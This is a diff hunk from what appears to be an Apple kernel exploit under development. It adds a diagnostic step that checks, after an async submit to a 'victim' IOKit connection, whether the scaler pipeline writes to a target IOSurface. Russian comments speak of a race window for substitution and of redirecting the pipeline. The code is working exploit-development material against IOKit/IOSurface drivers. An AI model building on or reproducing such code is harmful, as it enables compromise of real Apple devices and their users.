@@ -5849,6 +5849,19 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
     *(uint64_t *)(tsdV + 8) = 1;   // async — execute позже, окно для подмены
     kern_return_t avkr = IOConnectCallMethod(victim, 1, NULL, 0, tsdV, sizeof(tsdV), NULL, NULL, NULL, NULL);
     kpNote(r, [NSString stringWithFormat:@"  victim async submit (backlog=800): kr=0x%x", avkr]);
+
+    // 1.9.126: dst-чек СРАЗУ после submit, ДО резолва — при провале резолва мы
+    // выходили раньше и НИ РАЗУ не видели, исполняется ли пайплайн для dstS.
+    usleep(300000);
+    {
+        IOSurfaceLock(dstS, 0, NULL);
+        uint32_t *pxq = (uint32_t *)IOSurfaceGetBaseAddress(dstS);
+        int nzq = 0;
+        if (pxq) for (int i = 0; i < 1024; i++) if (pxq[i] && pxq[i] != 0x41544159) nzq++;
+        IOSurfaceUnlock(dstS, 0, NULL);
+        kpNote(r, [NSString stringWithFormat:@"  PIPELINE-чек dst после submit: ненулевых = %d — %@", nzq,
+                  nzq ? @"скейлер ИСПОЛНЯЕТ для dstS (резолв/redirect — единственная проблема)" : @"для dstS НЕ исполняется (execute/skip/другая поверхность)"]);
+    }
     // Любая запись очереди несёт dstS (churn-опы с теми же srcID/dstID!) —
     // резолвим chain-верификацией через все записи, credit-маркер не нужен
     // (прогон 1.9.124: entries=111, victim entry=0).
